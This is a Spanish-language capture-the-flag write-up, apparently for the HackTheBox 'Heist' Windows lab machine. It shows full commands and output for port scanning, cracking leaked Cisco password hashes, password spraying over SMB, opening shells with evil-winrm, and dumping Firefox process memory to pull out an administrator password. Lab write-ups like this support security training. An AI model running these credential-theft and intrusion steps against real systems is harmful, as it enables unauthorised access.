---
date: 2023-05-07 12:00:00
layout: post
title: Heist Writeup
subtitle: Writeup de la máquina Heist de la plataforma HackTheBox
description: Realizaré la máquina Heist explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Easy.
image: https://byte-mind.net/wp-content/uploads/2021/02/heist.png
optimized_image: https://byte-mind.net/wp-content/uploads/2021/02/heist.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Easy
  - Windows
author: FredBrave
---
# Enumeración
Empezamos con un escaneo con nmap a la maquina. Este sera rapido solo para descubrir los puertos abiertos.
```bash
sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.190.183 -oG Targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 12:13 EDT
Nmap scan report for 10.129.190.183
Host is up (0.18s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.13 seconds
```
Una vez hecho haremos un escaneo mas exhaustivo hacia los puertos abiertos. Esto es para encontrar versiones y identificar correctamente los servicios corriendo en la maquina.
```bash
sudo nmap -p80,135,445,5985,49669 -sCV 10.129.190.183 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 12:15 EDT
Nmap scan report for 10.129.190.183
Host is up (0.24s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-07T16:16:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.43 seconds
```
Encontramos algunos puertos interesantes, pero primero por metodologia enumeraremos el puerto 80 con el portal web.
<img class="img" src="/assets/img/machines/Heist/1.png" width="800">
Encuentro un login, podria tratar de encontrar unas default credentials investigando en google, pero al ver que hay una opcion de ingresar como guest abajo lo descarto y entro rapido a la web.
<img class="img" src="/assets/img/machines/Heist/2.png" width="800">
Una vez como guest la web me redirige a la ruta issues.php en donde podemos ver una conversacion muy interensate. El usuario Hazard esta dando un link a una ruta de un archivo de configuracion, esto para que el admin le ayude con la configuracion de dicho archivo.
<img class="img" src="/assets/img/machines/Heist/3.png" width="800">
En la ruta del archivo de configuracion encontramos lo que parece ser unos hashes raros con un 7 y 5 luego el hash.
```bash
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```
# Crackeando hashes
Investigando encontre que esos tipos de hashes son de la configuracion de cisco y que pueden ser crackeados en la <a href='https://www.ifm.net.nz/cookbooks/passwordcracker.html'>web</a>, mientras el hash 5 puede ser crackeado con john.
Creackee los hashes y me dieron los siguientes resultados.
```bash
5 stealth1agent
7 $uperP@ssword
7 Q4)sJu\Y8qz*A3?d
```
Una vez crackeados trate de encontrar usuarios validos con los usuarios que ya tengo vistos.
hazars, admin y rout3r.
Con crackmapexec intente validar las claves con algun usuario.
```bash
crackmapexec smb 10.129.190.183 -u users -p passwords.txt
SMB         10.129.190.183  445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.190.183  445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.190.183  445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.190.183  445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
```
# Shell como Chase
Tenemos credenciales intente encontrar algo util en el smb, pero no habia nada de mi interes. Sin encontrar mucho mas lo unico que podia hacer era enumerar mas usuarios y esto lo hice con la herramienta lookupsid.py.
```bash
lookupsid.py SUPPORTDESK/hazard:stealth1agent@10.129.190.183         
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at 10.129.190.183
[*] StringBinding ncacn_np:10.129.190.183[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```
Una vez tenido mas usuarios intente nuevamente encontrar credenciales con las claves que ya tenemos.
```bash
crackmapexec smb 10.129.190.183 -u users.txt -p passwords.txt 
SMB         10.129.190.183  445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.190.183  445    SUPPORTDESK      [-] SupportDesk\support:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.190.183  445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.190.183  445    SUPPORTDESK      [-] SupportDesk\support:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.190.183  445    SUPPORTDESK      [-] SupportDesk\Chase:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.190.183  445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d
```
Encontramos la clave de Chase. Despues de probar un poco encontre que el usuario Chase me permite conectarme por winrm lo que significa que Chase esta en el grupo Remote Management Users.
```bash
evil-winrm -i 10.129.190.183 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents>
```
# Shell como administrator
Enumerando encontre que la maquina tiene Firefox instalado y corriendo en el sistema.
```bash
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/21/2019   9:39 AM                Common Files
d-----        4/21/2019  11:00 AM                internet explorer
d-----        2/18/2021   4:21 PM                Mozilla Firefox
d-----        4/22/2019   6:47 AM                PHP
d-----        4/22/2019   6:46 AM                Reference Assemblies
d-----        4/22/2019   6:46 AM                runphp
d-----        2/18/2021   4:05 PM                VMware
d-r---        4/21/2019  11:00 AM                Windows Defender
d-----        4/21/2019  11:00 AM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:49 PM                Windows Mail
d-----        4/21/2019  11:00 AM                Windows Media Player
d-----        9/15/2018  12:49 PM                Windows Multimedia Platform
d-----        9/15/2018  12:58 PM                windows nt
d-----        4/21/2019  11:00 AM                Windows Photo Viewer
d-----        9/15/2018  12:49 PM                Windows Portable Devices
d-----        9/15/2018  12:49 PM                Windows Security
d-----        9/15/2018  12:49 PM                WindowsPowerShell
*Evil-WinRM* PS C:\Program Files> ps | findstr firefox
    356      25    16460      39016       0.14   6068   1 firefox
   1071      69   132212     209688       6.02   6448   1 firefox
    347      19    10192      38604       0.08   6560   1 firefox
    401      34    31668      90608       0.88   6780   1 firefox
    378      28    21696      58312       0.28   6976   1 firefox
```
Aqui podemos utilizar <a href='https://learn.microsoft.com/en-us/sysinternals/downloads/procdump'>procdump64.exe</a> para intentar sacar un dump de uno de los procesos del firefox. Una vez descargado y descomprimido subiremos este .exe a la maquina.
```bash
$ mv /home/kali/Downloads/Procdump.zip .
$ unzip Procdump.zip
Archive:  Procdump.zip
  inflating: procdump.exe            
  inflating: procdump64.exe          
  inflating: procdump64a.exe         
  inflating: Eula.txt

*Evil-WinRM* PS C:\Users\Chase> upload /home/kali/Maquinas/Machinesnormal/Heist/procdump64.exe .
Info: Uploading /home/kali/Maquinas/Machinesnormal/Heist/procdump64.exe to .

                                                             
Data: 566472 bytes of 566472 bytes copied

Info: Upload successful!
```
Y lo ejecutamos sobre el pid del firefox.
```bash
*Evil-WinRM* PS C:\Users\Chase> cd Documents
*Evil-WinRM* PS C:\Users\Chase\Documents> upload /home/kali/Maquinas/Machinesnormal/Heist/procdump64.exe
Info: Uploading /home/kali/Maquinas/Machinesnormal/Heist/procdump64.exe to C:\Users\Chase\Documents\procdump64.exe

*Evil-WinRM* PS C:\Users\Chase\Documents> dir


    Directory: C:\Users\Chase\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/7/2023  11:03 PM         424856 procdump64.exe


*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64.exe -accepteula -ma 6068

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[23:07:14] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_230507_230714.dmp
[23:07:14] Dump 1 writing: Estimated dump file size is 298 MB.
[23:07:17] Dump 1 complete: 298 MB written in 2.3 seconds
[23:07:17] Dump count reached.

*Evil-WinRM* PS C:\Users\Chase\Documents> dir


    Directory: C:\Users\Chase\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/7/2023  11:07 PM      304778129 firefox.exe_230507_230714.dmp
-a----         5/7/2023  11:03 PM         424856 procdump64.exe
```
Una vez hecho esto se descarga el archivo hecho por el procdump y intentamos buscar claves en el con grep.

```bash
strings firefox.exe_230507_230714.dmp | grep password
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
x:///chrome/toolkit/content/passwordmgr/
x:///chrome/en-US/locale/en-US/passwordmgr/
```
Y tenemos la password de administrator.
```bash
evil-winrm -i 10.129.190.183 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
supportdesk\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
Hemos pwneado la maquina!!!
